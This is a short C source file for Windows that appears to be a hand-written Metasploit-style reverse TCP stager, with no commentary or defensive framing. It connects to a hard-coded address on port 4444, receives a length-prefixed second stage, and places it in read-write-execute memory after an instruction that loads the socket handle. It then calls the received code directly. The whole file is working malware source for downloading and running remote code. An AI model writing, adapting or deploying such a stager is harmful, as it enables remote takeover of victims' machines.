#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>


int recv_stage(SOCKET sfd, void *buf, int len)
{
	int	tret;
	int	nret;
	void	*startb;

	tret = 0;
	nret = 0;
	startb = buf;
	while(tret < len)
	{
		nret = recv(sfd, (char *)startb, len - tret, 0);
		startb += nret;
		tret += nret;
		if (nret == SOCKET_ERROR)
		exit(0);
	}
	return (tret);
}

int main(void)
{
	SOCKET 	sfd;
	char	*buf;
	struct 	sockaddr_in servaddr;
	int 	tmp = 0;
	WSADATA wsa;
	ULONG32	size;
	int	count;
	void	(*function)();
	int	i;
	

	buf = VirtualAlloc(0, 500000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (WSAStartup(MAKEWORD(2, 2), &wsa) < 0)
	{
		WSACleanup();
		exit(1);
	}
	if ((sfd = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
		exit(1);
    	memset(&servaddr, 0, sizeof(servaddr));
	servaddr.sin_family = AF_INET;
	servaddr.sin_addr.s_addr = inet_addr("192.168.122.1");
	servaddr.sin_port = htons(4444);
	if (connect(sfd, (struct sockaddr *)&servaddr, sizeof(servaddr)) == -1)
		close(sfd);
	else
	{
		count = recv(sfd, (char *)&size, 4, 0);
		if (count != 4 || size <= 0)
			exit(0);
		buf = VirtualAlloc(0, size + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (buf == NULL)
			exit(1);
		buf[0] = 0xBF;
		memcpy(buf + 1, &sfd, 4);
		recv_stage(sfd, buf + 5, size);
		function = (void (*)())buf;
		function();
		buf = VirtualAlloc(0, 500000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	}
	exit(0);
}
